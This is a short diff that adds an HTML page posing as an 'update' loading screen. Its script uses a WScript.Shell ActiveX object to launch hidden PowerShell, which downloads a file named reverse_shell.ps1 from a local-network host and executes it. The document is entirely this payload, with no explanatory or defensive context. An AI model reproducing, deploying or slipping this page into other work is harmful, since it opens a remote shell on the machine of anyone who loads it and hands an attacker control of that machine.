@@ -1,0 +1,11 @@
+<html>
+<head>
+  <script>
+    var shell = new ActiveXObject("WScript.Shell");
+    shell.Run("powershell -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.150:8080/reverse_shell.ps1')\"");
+  </script>
+</head>
+<body>
+  <h1>Loading Update...</h1>
+</body>
+</html>
